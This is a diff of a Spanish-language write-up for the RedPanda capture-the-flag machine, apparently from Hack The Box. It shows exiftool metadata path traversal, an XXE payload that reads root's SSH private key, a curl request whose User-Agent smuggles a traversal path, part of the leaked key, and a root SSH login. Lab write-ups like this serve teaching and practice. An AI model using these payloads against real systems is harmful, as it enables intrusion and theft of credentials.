@@ -326,9 +326,9 @@ Si analizamos el flujo de lo que pasa en ese archivo, veremos que es posible rea
 Ahora la idea es que como podemos modificar ese xml y root lo va a interpretar, podríamos intentar un XXE para filtrar el id_rsa del usuario root.
 ```
 
-Vamos a realizar el ataque:
+Vamos a realizar el ataque, modificamos los metadatos de la imagen:
 
-```bash wrap=false intitle='Modificamos los metadatos de la imagen'
+```bash wrap=false
 ❯ exiftool -Artist=../../../../../../tmp/zelpro zelpro.jpg
     1 image files updated
 ❯ exiftool zelpro.jpg
@@ -360,12 +360,16 @@ Image Size                      : 1080x1080
 Megapixels                      : 1.2
 ```
 
-```bash wrap=false intitle='Generamos el archivo XML y le damos permisos completos'
+Generamos el archivo XML y le damos permisos completos
+
+```bash wrap=false 
 woodenk@redpanda:/tmp$ touch zelpro_creds.xml
 woodenk@redpanda:/tmp$ chmod 777 zelpro_creds.xml
 ```
 
-```xml wrap=false intitle='Le asignamos el contenido'
+Le asignamos el contenido:
+
+```xml wrap=false
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa"> ]>
 <credits>
@@ -390,11 +394,15 @@ woodenk@redpanda:/tmp$ chmod 777 zelpro_creds.xml
 </credits>
 ```
 
-```bash wrap=false intitle='Enviamos la solicitud maliciosa'
+Enviamos la solicitud maliciosa
+
+```bash wrap=false
 curl -s -X GET -A "prueba||/../../../../../../tmp/zelpro.jpg" http://10.10.11.170:8080/
 ```
 
-```xml wrap=false intitle='Conseguimos el id_rsa'
+Conseguimos el id_rsa:
+
+```xml wrap=false
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo>[
 <credits>
@@ -425,7 +433,9 @@ RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
 </credits>
 ```
 
-```bash wrap=false intitle='Conseguimos la flag'
+Conseguimos la flag:
+
+```bash wrap=false
 ❯ chmod 600 id_rsa
 ❯ ssh -i id_rsa root@10.10.11.170
 Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)
